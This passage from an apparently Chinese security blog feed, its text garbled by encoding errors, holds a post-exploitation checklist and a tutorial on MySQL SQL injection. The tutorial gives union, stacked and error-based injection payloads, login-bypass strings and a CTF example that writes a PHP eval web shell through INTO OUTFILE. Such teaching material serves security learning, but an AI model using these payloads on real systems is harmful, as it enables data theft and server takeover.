href="#åæ¸—é€" class="headerlink" title="åæ¸—é€"></a>åæ¸—é€</h1><p><img src="/../images/image-20230510184801834-1685533751889.png" alt="image-20230510184801834"></p><p>å®æ“è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŸŸä¿¡æ¯æ”¶é›†</span><br><span class="line">linuxææƒ</span><br><span class="line">ä»£ç†ç©¿é€ï¼ˆsocket5ï¼Œfrpï¼Œre_Georgeï¼Œproxiferï¼‰</span><br><span class="line">æ–‡ä»¶ä¼ è¾“</span><br><span class="line">ç®€å•å…æ€</span><br><span class="line">mimikatz</span><br><span class="line">ipc$ï¼ˆä½¿ç”¨ï¼Œæƒé™é—®é¢˜ï¼‰</span><br><span class="line">pthå“ˆå¸Œä¼ é€’</span><br><span class="line">msfä½¿ç”¨</span><br></pre></td></tr></table></figure><h2 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å†…ç½‘æœé›†/æ¢æµ‹ =&gt;  å…æ€ææƒ[éå¿…é¡»] =&gt; æŠ“å–ç™»å½•å‡­è¯ =&gt; ï¼ˆè·¨ï¼‰å¹³å°æ¨ªå‘ =&gt; å…¥å£ç»´æŒ =&gt; æ•°æ®å›ä¼  =&gt; å®šæœŸæƒé™ç»´æŠ¤</span><br></pre></td></tr></table></figure><p><a href="https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/">åŸŸæ¸—é€ä¸€æ¡é¾™æ‰‹å†Œ</a></p><h1 id="äº§å‡ºæŠ¥å‘Š"><a href="#äº§å‡ºæŠ¥å‘Š" class="headerlink" title="äº§å‡ºæŠ¥å‘Š"></a>äº§å‡ºæŠ¥å‘Š</h1><p><a href="https://www.anquanke.com/post/id/215031#h3-5">å¦‚ä½•ç¼–å†™ä¸€ä»½ä¸“ä¸šçš„æ¸—é€æµ‹è¯•æŠ¥å‘Š-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a></p><p><a href="https://github.com/awake1t/HackReport/tree/main/01-%E6%8A%A5%E5%91%8A%E6%A8%A1%E6%9D%BF">HackReport&#x2F;01-æŠ¥å‘Šæ¨¡æ¿ at main Â· awake1t&#x2F;HackReport</a></p><p><strong>ä¿®å¤å»ºè®®â€“æ¸—é€æµ‹è¯•ä¿®å¤å»ºè®®æ€»ç»“.pdf</strong></p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://blog.gm7.org/">Introduction </a></p><p><a href="https://gitbook.se7ensec.cn/#duan-kou-sao-miao">åœ¨çº¿å·¥å…· - è‚¾é€æµ‹è¯•ä¸­å¿ƒ</a></p><p><a href="https://gitbook.se7ensec.cn/hong-dui-zuo-zhan-shou-ce#liu-cheng-jian-yao-shuo-ming">çº¢é˜Ÿä½œæˆ˜æ‰‹å†Œ - è‚¾é€æµ‹è¯•ä¸­å¿ƒ</a></p><p><a href="https://github.com/bin-maker/BYPASS-CDN/">https://github.com/bin-maker/BYPASS-CDN/</a></p><p><a href="https://www.secpulse.com/archives/194410.html">https://www.secpulse.com/archives/194410.html</a></p><p><a href="https://wiki.wgpsec.org/knowledge/">ç‹¼ç»„å®‰å…¨å›¢é˜Ÿå…¬å¼€çŸ¥è¯†åº“</a></p><p><a href="https://www.wangan.com/p/7fy7fy135d85fec8">https://www.wangan.com/p/7fy7fy135d85fec8</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é€šè¿‡mysqlå­¦ä¹ sqlæ³¨å…¥</title>
      <link href="/2023/05/31/%E9%80%9A%E8%BF%87Mysql%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/31/%E9%80%9A%E8%BF%87Mysql%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h2><p>æœåŠ¡å™¨å°†<strong>ç”¨æˆ·æäº¤çš„å‚æ•°</strong>é”™è¯¯åœ°<strong>æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­</strong>ï¼Œ<strong>æ‰“ç ´äº†æ•°æ®åŒºåŸŸçš„è¾¹ç•Œï¼ˆæ•°å­—å‹ä¸éœ€è¦ï¼‰æ”¹å˜äº†åŸæœ‰çš„sqlæ‰§è¡Œé€»è¾‘</strong>ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ‰§è¡Œæ¶æ„çš„sqlè¯­å¥ã€‚</p><p>ç®€å•çš„ä¾‹å­</p><p>å‡è®¾</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from users where id=&#x27;<span class="subst">$id</span>&#x27;;&quot;</span></span><br></pre></td></tr></table></figure><p>ç”¨æˆ·æäº¤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and 1=1 #</span></span><br></pre></td></tr></table></figure><p>æ‹¼æ¥åçš„sqlè¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and 1=1 #&#x27;</span><br></pre></td></tr></table></figure><p>è¦è¿›è¡Œæ³¨å…¥ï¼Œåªéœ€è¦å°†<code>and 1=1</code>éƒ¨åˆ†æ›¿æ¢ä¸ºå…¶ä»–sqlè¯­å¥å³å¯ã€‚</p><blockquote><p>å…¶å®åˆ†æ<code>sqlmap</code>çš„æ³¨å…¥ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œæ³¨å…¥è¯­å¥ç”±<code>prefix</code>ï¼Œ<code>payload</code>å’Œ<code>suffix</code>ç»„æˆ</p></blockquote><p>å›¾æ¥æº<a href="https://www.freebuf.com/column/161797.html">https://www.freebuf.com/column/161797.html</a></p><p><img src="/../images/image-20230522131723064.png" alt="image-20230522131723064"></p><h2 id="æ¼æ´å±å®³â€“æ”»å‡»é¢"><a href="#æ¼æ´å±å®³â€“æ”»å‡»é¢" class="headerlink" title="æ¼æ´å±å®³â€“æ”»å‡»é¢"></a>æ¼æ´å±å®³â€“æ”»å‡»é¢</h2><ul><li><p>æ‹¿åˆ°æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚æ‰‹æœºå·ï¼Œèº«ä»½è¯ï¼Œé‚®ç®±ï¼Œå®¶åº­åœ°å€ç­‰</p></li><li><p>åå°è´¦å·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸‡èƒ½å¯†ç ï¼Ÿè¿™å¹´å¤´è¿˜æœ‰å—ğŸ¤”</span><br><span class="line">æ‹¿åˆ°å¯†ç ï¼Œä½†æ˜¯ä¸€èˆ¬å¯†ç éƒ½æ˜¯åŠ ç›å†åŠ å¯†çš„äº†å§ï¼Œéœ€è¦å½©è™¹è¡¨å•¥çš„ã€‚</span><br><span class="line">æˆ–è€…å †å æ³¨å…¥åˆ›å»ºä¸€ä¸ªï¼Œä¿®æ”¹ä¸€ä¸ªç­‰                       </span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶ä»»æ„è¯»å–</p></li><li><p>Getshell</p></li><li><p>RCE</p></li><li><p>ææƒ</p></li></ul><h2 id="å¦‚ä½•åˆ©ç”¨"><a href="#å¦‚ä½•åˆ©ç”¨" class="headerlink" title="å¦‚ä½•åˆ©ç”¨"></a>å¦‚ä½•åˆ©ç”¨</h2><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p><img src="/../images/image-20230522131900429.png" alt="image-20230522131900429"></p><h4 id="ç«™åº“åˆ†ç¦»"><a href="#ç«™åº“åˆ†ç¦»" class="headerlink" title="ç«™åº“åˆ†ç¦»"></a>ç«™åº“åˆ†ç¦»</h4><h5 id="ä¸ºä»€ä¹ˆ"><a href="#ä¸ºä»€ä¹ˆ" class="headerlink" title="ä¸ºä»€ä¹ˆ"></a>ä¸ºä»€ä¹ˆ</h5><p>ç«™åº“åˆ†ç¦»ï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡æ•°æ®åº“è¿›è¡Œè¯»å†™</p><h5 id="åˆ¤æ–­æ–¹æ³•"><a href="#åˆ¤æ–­æ–¹æ³•" class="headerlink" title="åˆ¤æ–­æ–¹æ³•"></a>åˆ¤æ–­æ–¹æ³•</h5><ul><li><p>é€šç”¨æ–¹æ³•</p><p>è¯»å–é…ç½®æ–‡ä»¶ï¼Œåˆ¤æ–­IP</p></li><li><p>Mysql</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@hostname; //æœåŠ¡ç«¯ä¸»æœºåç§° select * from information_schema.PROCESSLIST; //å®¢æˆ·ç«¯ä¸»æœºåç§°å’Œç«¯å£</span><br></pre></td></tr></table></figure><blockquote><p>Windowsè¿æ¥æ ¼å¼ï¼šä¸»æœºå:Port</p><p>Linuxè¿æ¥æ ¼å¼ï¼šIP:Port</p><p>æœ¬åœ°è¿æ¥æ ¼å¼ï¼šlocalhost:Port</p></blockquote><p><img src="/../images/image-20230522203905326.png" alt="image-20230522203905326"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user()ï¼›</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœä¸æ˜¯localhostï¼Œå¤§æ¦‚ç‡æ˜¯ç«™åº“åˆ†ç¦»ã€‚</p></blockquote><p><img src="/../images/image-20230522204233420.png" alt="image-20230522204233420"></p></li></ul><h4 id="æ•°æ®åº“ç±»å‹"><a href="#æ•°æ®åº“ç±»å‹" class="headerlink" title="æ•°æ®åº“ç±»å‹"></a>æ•°æ®åº“ç±»å‹</h4><p><img src="/../images/image-20230519205623244-1685603526750.png"></p><h4 id="å„ç§ä¿¡æ¯"><a href="#å„ç§ä¿¡æ¯" class="headerlink" title="å„ç§ä¿¡æ¯"></a>å„ç§ä¿¡æ¯</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ifnull(@@secure_file_priv,0) secure_file_privä¸ºç©ºæ—¶è¿”å›0,ä¸ä¸ºç©ºæ—¶è¿”å›å…¶å€¼</span><br><span class="line">SELECT concat_ws(0x0a,</span><br><span class="line">ifnull(@@secure_file_priv,0),</span><br><span class="line">concat_ws(0xefbc8c, @@version, @@version_compile_os, @@version_compile_machine, @@version_comment),</span><br><span class="line">concat_ws(0xefbc8c, @@hostname, @@port),</span><br><span class="line">concat_ws(0xefbc8c, user(), database()),</span><br><span class="line">concat_ws(0xefbc8c, @@datadir, @@plugin_dir, @@tmpdir, @@basedir)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ç»“æœ</span><br><span class="line">0</span><br><span class="line">10.5.8-MariaDB-3ï¼Œdebian-linux-gnuï¼Œx86_64ï¼ŒDebian buildd-unstable</span><br><span class="line">kaliï¼Œ3306</span><br><span class="line">root@localhost</span><br><span class="line">/var/lib/mysql/ï¼Œ/usr/lib/mysql/plugin/ï¼Œ/tmpï¼Œ/usr</span><br></pre></td></tr></table></figure><h3 id="åˆ¤æ–­"><a href="#åˆ¤æ–­" class="headerlink" title="åˆ¤æ–­"></a>åˆ¤æ–­</h3><h4 id="æ³¨å…¥ç‚¹"><a href="#æ³¨å…¥ç‚¹" class="headerlink" title="æ³¨å…¥ç‚¹"></a>æ³¨å…¥ç‚¹</h4><p>ä¸€åˆ‡ä¸æ•°æ®åº“æœ‰äº¤äº’çš„åœ°æ–¹ï¼Œå–å†³äºåç«¯ä»HTTPè¯·æ±‚æŠ¥æ–‡ä¸­æå–äº†ä»€ä¹ˆæ•°æ®å¹¶æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ã€‚</p><h4 id="æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥"><a href="#æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥" class="headerlink" title="æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥"></a>æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥</h4><ul><li><p>å­—ç¬¦å‹oræ•°å­—å‹ï¼šfuzzé—­åˆç±»å‹</p></li><li><p>æ˜¯å¦æœ‰æŠ¥é”™ï¼Œæ˜¯å¦èƒ½é€ƒé€¸æ‰§è¡Œsqlè¯­å¥ï¼ˆé€»è¾‘ï¼Œå»¶æ—¶ç­‰åˆ¤æ–­ï¼‰</p></li></ul><h4 id="åç«¯è¯­å¥"><a href="#åç«¯è¯­å¥" class="headerlink" title="åç«¯è¯­å¥"></a>åç«¯è¯­å¥</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å¾—åˆ°åç«¯æ‰§è¡Œçš„sqlè¯­å¥</span><br><span class="line">select * from test.users where id=1 union SELECT (select INFO FROM INFORMATION_SCHEMA.PROCESSLIST WHERE INFO LIKE &#x27;%673245283%&#x27; LIMIT</span><br><span class="line"> 1),2,3;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528210843123.png" alt="image-20230528210843123"></p><h3 id="Mysqlæ³¨å…¥æ‰‹æ®µ"><a href="#Mysqlæ³¨å…¥æ‰‹æ®µ" class="headerlink" title="Mysqlæ³¨å…¥æ‰‹æ®µ"></a>Mysqlæ³¨å…¥æ‰‹æ®µ</h3><h4 id="adminç™»å…¥"><a href="#adminç™»å…¥" class="headerlink" title="adminç™»å…¥"></a>adminç™»å…¥</h4><ul><li><p>ä¸‡èƒ½å¯†ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åç«¯ä»£ç Demo</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="subst">$user</span>&#x27; and passwd=&#x27;<span class="subst">$passwd</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ç™»é™†æˆåŠŸ&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡å¸ƒå°”è¿ç®—è®©whereæ’ä¸ºçœŸ</p><p><img src="/../images/image-20230312212035948.png" alt="image-20230312212035948"></p></li><li><p>æ³¨å†Œè¦†ç›–</p><blockquote><p>admin (æœ‰ä¸ªç©ºæ ¼)æˆ–è€… (æœ‰ä¸ªç©ºæ ¼)admin</p><p>åŸç†ï¼šç”¨æˆ·åå­—æ®µé•¿åº¦&gt;5ï¼Œæ‰€ä»¥å¯ä»¥æ·»åŠ ç©ºæ ¼ï¼Œè€Œsqlè¯­å¥æ‰§è¡Œæ—¶ä¼šå°†ç©ºæ ¼å¿½ç•¥ã€‚</p></blockquote><p><img src="/../images/image-20230312210909402.png" alt="image-20230312210909402"></p></li><li><p>è”åˆæŸ¥è¯¢æ„é€ ä¸´æ—¶ç”¨æˆ·</p><p><code>[GXYCTF2019]BabySQli</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åç«¯ä»£ç Demo</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;</span>.<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="variable">$users</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>)) &#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;æŠ±æ­‰ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ã€‚&#x27;);history.back();&lt;/Script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$passwords</span>=<span class="variable">$users</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)&lt;&gt;<span class="variable">$passwords</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;æŠ±æ­‰ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ã€‚&#x27;);history.back();&lt;/Script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ç™»é™†æˆåŠŸ&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27; union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27; limit 1,2--+</span><br><span class="line"></span><br><span class="line">passwd=c4ca4238a0b923820dcc509a6f75849b</span><br><span class="line"></span><br><span class="line">MD5(1)=c4ca4238a0b923820dcc509a6f75849b</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230312215147770.png" alt="image-20230312215147770"></p></li></ul><h4 id="è”åˆæŸ¥è¯¢æ³¨å…¥"><a href="#è”åˆæŸ¥è¯¢æ³¨å…¥" class="headerlink" title="è”åˆæŸ¥è¯¢æ³¨å…¥"></a>è”åˆæŸ¥è¯¢æ³¨å…¥</h4><h5 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h5><p>sqlè¯­å¥ä¸º<code>select</code>,é¡µé¢æœ‰å›æ˜¾æŸ¥è¯¢ç»“æœã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users where id=<span class="subst">$id</span> &quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br></pre></td></tr></table></figure><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p><strong>å…ˆé€šè¿‡order byç­‰è¯­å¥åˆ¤æ–­åˆ—æ•°ï¼Œå†åˆ¤æ–­å“ªä¸€åˆ—æ˜¯è¾“å‡ºç‚¹ï¼Œæœ€åè¿›è¡Œæ³¨å…¥</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è”åˆæŸ¥è¯¢ï¼Œè·å–åº“å</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(schema_name),3 from information_schema.schemata#</span><br><span class="line"></span><br><span class="line">è”åˆæŸ¥è¯¢ï¼Œè·å–è¡¨å </span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;å·²çŸ¥åº“å&#x27;#</span><br><span class="line"></span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(table_name) from mysql.innodb_table_stats where database_name=&#x27;å·²çŸ¥åº“å&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è”åˆæŸ¥è¯¢ï¼Œè·å–å­—æ®µå</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;å·²çŸ¥è¡¨å&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è”åˆæŸ¥è¯¢ï¼Œè·å–å­—æ®µå€¼</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(å­—æ®µ1ï¼Œå­—æ®µ2...) from å·²çŸ¥è¡¨å#</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼š</p><p>å› ä¸ºåç«¯æŸ¥è¯¢è¯­å¥å¯èƒ½åªæ‹¿ç¬¬ä¸€è¡ŒæŸ¥è¯¢ç»“æœå¦‚<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code>ï¼Œæ‰€ä»¥éœ€è¦æ„é€ ä¸€ä¸ªä¸å­˜åœ¨çš„å€¼å¦‚-1ï¼Œä½¿å¾—è”åˆæŸ¥è¯¢çš„ç»“æœæˆä¸ºç¬¬ä¸€è¡Œï¼›</p><p>è¦æŸ¥çš„è¡¨çš„åç§°(è¿™ä¸ªè¡¨æ˜¯ä¸æ˜¯åœ¨ç°åœ¨ä½¿ç”¨çš„æ•°æ®åº“ä¸­ï¼Œæ²¡æœ‰çš„è¯è¡¨å&#x3D;æ•°æ®åº“.è¡¨å)</p></blockquote><h4 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h4><h5 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h5><blockquote><p>åç«¯ä½¿ç”¨çš„æŸ¥è¯¢å‡½æ•°ä¸º<code>mysqli_multi_query()</code> ï¼Œæ”¯æŒå¤šæ¡è¯­å¥æŸ¥è¯¢</p><p>è€Œä¸æ˜¯<code>mysqli_query()</code> ï¼Œä»…æ”¯æŒä¸€æ¡è¯­å¥æŸ¥è¯¢</p></blockquote><h5 id="å±€é™æ€§"><a href="#å±€é™æ€§" class="headerlink" title="å±€é™æ€§"></a>å±€é™æ€§</h5><ul><li><p>å¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ° API æˆ–è€…æ•°æ®åº“å¼•æ“çš„å½±å“</p></li><li><p>æ— å›æ˜¾ï¼šåœ¨ Web ä¸­ä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤ï¼Œå †å æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æœåªèƒ½è¢«å¿½ç•¥</p><p><strong>è§£å†³æ–¹æ³•</strong>ï¼šå¯ä»¥é€šè¿‡å…ˆå°†å†…å®¹æ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œç„¶åå†é€šè¿‡æŸ¥è¯¢æŸ¥å‡ºæ¥</p></li></ul><h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;;sqlè¯­å¥;--+</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ä»»æ„æ‰§è¡Œsqlè¯­å¥ï¼Œå±å®³å¾ˆå¤§</p><h6 id="é…åˆhandleç»•è¿‡å…³é”®å­—"><a href="#é…åˆhandleç»•è¿‡å…³é”®å­—" class="headerlink" title="é…åˆhandleç»•è¿‡å…³é”®å­—"></a>é…åˆhandleç»•è¿‡å…³é”®å­—</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler è¡¨å  open ; handler è¡¨å read first; #æ‰“å¼€è¡¨ï¼›è¯»å–ç¬¬ä¸€æ¡æ•°æ®</span><br><span class="line">handler è¡¨å read next;#ä¸ä¸Šä¸€æ¡è¯­å¥ä¸€èµ·ç”¨ï¼Œè¯»å–ä¸‹ä¸€æ¡å³ç¬¬äºŒæ¡æ•°æ®</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">ã€MySQLã€‘MySQL ä¹‹ handler çš„è¯¦ç»†ä½¿ç”¨åŠè¯´æ˜</a></p><h6 id="é…åˆé¢„ç¼–è¯‘è¯­å¥ç»•è¿‡"><a href="#é…åˆé¢„ç¼–è¯‘è¯­å¥ç»•è¿‡" class="headerlink" title="é…åˆé¢„ç¼–è¯‘è¯­å¥ç»•è¿‡"></a>é…åˆé¢„ç¼–è¯‘è¯­å¥ç»•è¿‡</h6><p>ä½¿ç”¨æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @tn = &#x27;hahaha&#x27;;  //å­˜å‚¨è¡¨å</span><br><span class="line">set @sql = concat(&#x27;select * from &#x27;, @tn);  //å­˜å‚¨SQLè¯­å¥</span><br><span class="line"></span><br><span class="line">prepare query from @sql;   //é¢„å®šä¹‰SQLè¯­å¥</span><br><span class="line"></span><br><span class="line">execute query;  //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥</span><br><span class="line"></span><br><span class="line">(DEALLOCATE || DROP) prepare sqla;  //åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥</span><br></pre></td></tr></table></figure><h5 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h5><p>[SUCTF 2018]MultiSQL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=select &#x27;&lt;?php eval($_POST[khaz]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell3.php&#x27;;prepare name from @sql;execute name;</span><br></pre></td></tr></table></figure><p>è½¬æ¢è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;select &#x27;&lt;?php eval($_POST[khaz]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell3.php&#x27;&quot;</span></span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    b.append(<span class="built_in">str</span>(<span class="built_in">ord</span>(i)))</span><br><span class="line">c=<span class="string">&#x27;,&#x27;</span>.join(b)</span><br><span class="line">res = <span class="string">&#x27;char(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(c)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=char(117,112,100,97,116,101,32,115,99,111,114,101,32,115,101,116,32,108,105,115,116,101,110,61,50,48,48);prepare query from @sql;execute query;</span><br></pre></td></tr></table></figure><h4 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h4><h5 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h5><p><strong>ä½¿ç”¨<code>mysql_error()</code>å‡½æ•°ï¼Œå¯ä»¥è¿”å›ä¸Šä¸€ä¸ªMysqlæ“ä½œäº§ç”Ÿçš„æ–‡æœ¬é”™è¯¯ä¿¡æ¯ã€‚</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;wrong_user&quot;</span>,<span class="string">&quot;wrong_pwd&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">&#125;</span><br><span class="line">&gt;&gt;</span><br><span class="line">Access denied <span class="keyword">for</span> user <span class="string">&#x27;wrong_user&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">(using password: YES)</span><br></pre></td></tr></table></figure><h5 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h5><p>æœ€å¸¸ç”¨çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Xpatè¯­æ³•é”™è¯¯ï¼ŒæŠ¥é”™ä¿¡æ¯æ˜¯æœ‰é•¿åº¦é™åˆ¶çš„ï¼Œæœ€å¤§é•¿åº¦é™åˆ¶32ä½,é…åˆsubstr()ç­‰æˆªå–å­—ç¬¦ä¸²å‡½æ•°ä½¿ç”¨</span><br><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523184243091.png" alt="image-20230523184243091"></p><p>å…¶ä»–<a href="https://hatboy.github.io/2018/08/28/MySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">MySQLæŠ¥é”™æ³¨å…¥ </a></p><h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŸå‹ï¼š</span><br><span class="line">?id=1&quot;or(updatexml(1,concat(0x7e,(),0x7e),1))--+</span><br><span class="line"></span><br><span class="line">çˆ†åº“:</span><br><span 